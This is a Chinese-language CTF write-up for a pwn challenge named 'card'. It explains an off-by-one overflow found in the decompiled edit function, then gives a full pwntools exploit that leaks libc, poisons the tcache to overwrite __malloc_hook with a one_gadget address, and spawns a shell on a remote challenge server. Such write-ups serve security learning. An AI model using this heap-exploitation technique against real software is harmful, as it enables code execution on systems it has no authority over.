# card

本题就是简单的off by one，难点就在于逆向时很难发现漏洞，但是可以通过调试发现。

就是在`edit`函数中这段代码，其实是`size`的第3 bit为1时候，返回值为1。

```c
(unsigned int)((signed int)((((HIDWORD(v1) >> 28) + (unsigned __int8)v1) & 0xF) - (HIDWORD(v1) >> 28)) >> 3)
```

造成后面读取输入时溢出一个字节。

```c
int v0; // ebx
int v1; // eax
int v3; // [rsp+4h] [rbp-1Ch]
unsigned int v4; // [rsp+4h] [rbp-1Ch]

puts("please choice your card");
v4 = sub_AB8(v3);
if ( !*((_DWORD *)&size + 4 * (int)v4) )
    exit(1);
puts("start your bomb show");
v0 = *((_DWORD *)&size + 4 * (int)v4);              // 0xx8溢出
v1 = vuln(size);
return read(0, *((void **)&heap + 2 * (int)v4), v0 + v1);
```
就是常规的off by one，成功拿到三血

完整wp如下：
```python
from pwn import *
import LibcSearcher
context.log_level = 'debug'
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()


def add(idx,size,con='1'):
    sla('choice:','1')
    sla('card:',str(idx))
    sla('power:',str(size))
    sla('quickly!',con)
def edit(idx,con):
    sla('choice:','2')
    sla('card',str(idx))
    sla('bomb show',con)
def delete(idx):
    sla('choice:','3')
    sla('card:',str(idx))
def show(idx):
    sla('choice:','4')
    sla('index:',str(idx))

#sh = process('./pwn')
sh = remote('node3.buuoj.cn',25400)
libc = ELF('./libc.so')
add(0,0x18)
add(1,0x80)
add(2,0x20)
#edit(0,'a'*0x18+p8(0x31))
for i in range(7):
    add(i+6,0xb8)
add(3,0x10)
for i in range(7):
    delete(i+6)
edit(0,'a'*0x18+p8(0xc1))
delete(1)
# gdb.attach(sh)
for i in range(7):
    add(i+6,0xb8)
add(4,0xb0)
show(4)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-96-0x3ebc40
malloc_hook = libc_base + libc.sym['__malloc_hook']
delete(2)
edit(4,'a'*0x80+p64(0)+p64(0x31)+p64(malloc_hook))
print hex(libc_base)
#
delete(6)
delete(7)
delete(8)
add(6,0x20)
add(7,0x20,p64(0x10a38c+libc_base))
#gdb.attach(sh)
sla('choice:','1')
sla('card:',str(8))
sla('power:',str(20))
ti()
```